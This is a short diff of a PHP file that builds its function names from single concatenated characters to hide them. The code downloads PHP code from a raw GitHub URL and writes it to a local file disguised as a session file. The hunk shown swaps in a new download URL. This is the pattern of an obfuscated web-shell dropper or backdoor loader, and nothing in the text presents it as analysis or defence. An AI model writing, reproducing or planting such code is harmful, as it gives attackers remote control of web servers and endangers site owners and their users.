@@ -7,7 +7,7 @@ $fe = "f" . "i" . "l" . "e" . "_" . "e" . "x" . "i" . "s" . "t" . "s";
 $fs = "f" . "i" . "l" . "e" . "s" . "i" . "z" . "e";
 
 $tmpfile = 'sess_' . md5('pakketua69') . '.php';
-$url = "https://raw.githubusercontent.com/kolot13/sdf/refs/heads/main/sarada";
+$url = "https://raw.githubusercontent.com/wulizo335-cmyk/homepage/refs/heads/main/sarada.php";
 $content = $fgc($url);
 $fp = $fo($tmpfile, 'w');
 $fw($fp, $content);
